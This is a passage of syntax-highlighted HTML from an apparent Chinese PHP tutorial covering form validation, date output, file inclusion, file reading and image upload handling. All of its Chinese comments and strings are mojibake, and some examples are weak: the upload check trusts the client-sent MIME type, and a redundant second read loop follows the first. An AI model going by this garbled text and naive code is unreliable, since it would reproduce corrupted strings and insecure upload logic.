class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/([\w\-]+\@[\w\-]+\.[\w\-]+)/"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$emailErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"éæ³•é‚®ç®±æ ¼å¼"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"website"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$website</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$website</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"website"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// æ£€æµ‹ URL åœ°å€æ˜¯å¦åˆæ³•</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&amp;@#\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\/%=~_|]/i"</span><span class="token punctuation">,</span><span class="token variable">$website</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$websiteErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"éæ³•çš„ URL çš„åœ°å€"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ€§åˆ«æ˜¯å¿…éœ€çš„"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function-definition function">test_input</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>PHP è¡¨å•éªŒè¯å®ä¾‹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* å¿…éœ€å­—æ®µã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PHP_SELF"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    åå­—: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$nameErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   E-mail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$email</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$emailErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   ç½‘å€: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>website<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$website</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$websiteErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   å¤‡æ³¨: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$comment</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   æ€§åˆ«:   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$gender</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$gender</span><span class="token operator">==</span><span class="token string double-quoted-string">"female"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"checked"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>å¥³   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>gender<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$gender</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$gender</span><span class="token operator">==</span><span class="token string double-quoted-string">"male"</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"checked"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>male<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>ç”·   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>* <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$genderErr</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2&gt;æ‚¨è¾“å…¥çš„å†…å®¹æ˜¯:&lt;/h2&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$email</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$website</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$comment</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$gender</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ—¶é—´"><a href="#æ—¶é—´" class="headerlink" title="æ—¶é—´"></a>æ—¶é—´</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y/m/d"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y.m.d"</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">;</span><span class="token comment">//æˆ–è€…</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//æ£€æµ‹æ–‡ä»¶æ˜¯å¦åˆ°è¾¾æœ«å°¾</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//é€è¡Œè¯»</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//æ£€æµ‹æ–‡ä»¶æ˜¯å¦åˆ°è¾¾æœ«å°¾</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token comment">//é€è¡Œè¯»</span><span class="token punctuation">}</span><span class="token comment">//æ‰§è¡Œä¸€äº›ä»£ç </span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>èœé¸Ÿæ•™ç¨‹<span class="token punctuation">(</span>runoob<span class="token operator">.</span>com<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"upload_file.php"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"post"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token operator">&gt;</span>æ–‡ä»¶åï¼š<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"æäº¤"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"é”™è¯¯ï¼š"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸Šä¼ æ–‡ä»¶å: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ç±»å‹: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶å¤§å°: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" kB&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æ–‡ä»¶ä¸´æ—¶å­˜å‚¨çš„ä½ç½®: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€</span><span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// è·å–æ–‡ä»¶åç¼€å</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token 